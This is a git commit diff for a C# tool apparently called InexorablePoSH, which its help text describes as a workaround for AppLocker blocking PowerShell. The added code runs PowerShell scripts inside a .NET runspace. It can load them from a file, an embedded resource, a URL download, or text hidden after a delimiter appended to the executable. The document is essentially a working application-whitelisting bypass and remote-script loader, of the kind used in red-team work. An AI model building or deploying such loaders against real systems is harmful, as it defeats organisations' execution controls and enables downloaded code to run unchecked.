b1c7ac9cb494bf560ecce653c66c6717901595c4
sixdub <justin@sixdub.net>
2014-12-03 10:28:41 -0500

    V1.1. Built out script location options

--- InexorablePoSH/InexorablePoSH/Program.cs
+++ InexorablePoSH/InexorablePoSH/Program.cs
@@ -13,6 +13,7 @@ using System.Resources;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Net;
 
 //Adding libraries for powershell stuff
 using System.Collections.ObjectModel;
@@ -24,7 +25,7 @@ namespace InexorablePoSH
 {
     class Program
     {
-        static void Main(string[] args)
+        static string RunPS(string cmd)
         {
             //Init stuff
             Runspace runspace = RunspaceFactory.CreateRunspace();
@@ -33,8 +34,7 @@ namespace InexorablePoSH
             Pipeline pipeline = runspace.CreatePipeline();
 
             //Add commands
-            string script = Properties.Resources.ResourceManager.GetString("Script");
-            pipeline.Commands.AddScript(script);
+            pipeline.Commands.AddScript(cmd);
 
             //Prep PS for string output and invoke
             pipeline.Commands.Add("Out-String");
@@ -45,9 +45,111 @@ namespace InexorablePoSH
             StringBuilder stringBuilder = new StringBuilder();
             foreach (PSObject obj in results)
             {
-                stringBuilder.AppendLine(obj.ToString());
+                stringBuilder.Append(obj);
             }
-            Console.Write(stringBuilder.ToString());
+            return stringBuilder.ToString().Trim();
+        }
+
+        static void PrintHelp()
+        {
+            Console.Write("InexorablePoSH\n"+
+                "Workaround for AppLocker deny of Powershell using .NET\n"+
+                "\n"+
+                "inexorableposh.exe [<flag> <argument>]\n"+
+                "flags:\n" +
+                "-f <file> : Read script from specified file\n" +
+                "-r <resource name> : Read script from specified resource\n" +
+                "-d <url> : Read script from URL\n" +
+                "-a <delimeter> : Read script appended to current binary after specified delimeter. Delimeter should be very very unique string\n");
+        }
+        
+        static int Main(string[] args)
+        {
+            string script;
+
+            //Check the options
+            if (args.Length != 2)
+            {
+                Console.WriteLine("[!] Error: Proper arguments required");
+                PrintHelp();
+                return -1;
+            }
+
+            //define our flag and argument
+            string flag = args[0];
+            string optarg = args[1];
+
+            //Check all our options for the flag
+            //When found right flag, get the script variable in the specified manner
+            if (flag == "-f")
+            {
+                //read file from disk and pass to powershell
+                try
+                { 
+                    script = System.IO.File.ReadAllText(optarg);
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Error: File Fail");
+                    return (-1);
+                }
+            }
+            else if (flag == "-r")
+            {
+                //Read powershell from resource of a specific name
+                try
+                {
+                    script = Properties.Resources.ResourceManager.GetString(optarg);
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Error: Resource Fail");
+                    return (-1);
+                }
+            }
+            else if (flag == "-d")
+            {
+                //download the script 
+                try
+                {
+                    WebClient psdown = new WebClient();
+                    script = psdown.DownloadString(optarg);
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Error: Download Fail");
+                    return (-1);
+                }
+            }
+            else if (flag == "-a")
+            {
+                try
+                {
+                    string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                    string selfcontent = System.IO.File.ReadAllText(self);
+                    script = selfcontent.Split(new string[] { optarg }, StringSplitOptions.None)[1];
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Error: Append Read fail");
+                    return (-1);
+                }
+            }
+            else
+            {
+                Console.WriteLine("[!] Error: Improper flag");
+                PrintHelp();
+                return (-1);
+            }
+
+            //We should now have the script variable filled... double check before executing
+            if (script != null)
+            {
+                string results = RunPS(script);
+                Console.Write(results);
+            }
+            return 0;
+
         }
     }
 }
